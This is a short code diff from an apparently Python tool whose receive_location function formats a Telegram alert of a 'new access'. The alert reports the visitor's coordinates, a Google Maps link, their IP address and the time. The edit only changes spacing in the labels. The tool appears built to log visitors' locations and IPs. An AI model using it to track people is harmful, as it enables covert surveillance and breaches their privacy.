@@ -31,10 +31,10 @@ def receive_location():
         mensagem = f"""
 📢 *Novo Acesso Registrado!*
 
-🌍 *Localização:* [{latitude}, {longitude}]({maps_link})  
-📍 *Google Maps:* [Ver Localização]({maps_link})  
-💻 *IP do Usuário:* `{user_ip}`  
-⏰ *Data e Hora:* {data_hora}
+🌍 *Localização: * [{latitude}, {longitude}]({maps_link})  
+📍 *Google Maps :* [Ver Localização]({maps_link})  
+💻 *IP do Usuário :* `{user_ip}`  
+⏰ *Data e Hora :* {data_hora}
 """
 
         # Enviar para o Telegram
